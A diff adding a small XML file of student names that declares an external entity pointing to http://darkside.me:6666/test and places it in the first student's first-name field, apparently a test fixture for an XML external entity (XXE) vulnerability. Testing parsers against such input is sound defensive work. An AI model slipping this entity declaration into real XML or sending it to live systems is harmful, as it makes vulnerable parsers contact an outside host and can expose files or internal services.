@@ -1,0 +1,13 @@
+<?xml version="1.0" ?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://darkside.me:6666/test"> ]>
+<students>
+	<student>
+		<firstname>&xxe;</firstname>
+		<lastname>Skywalker</lastname>
+	</student>
+	<student>
+		<firstname>Luke</firstname>
+		<lastname>Skywalker</lastname>
+	</student>
+</students>
+
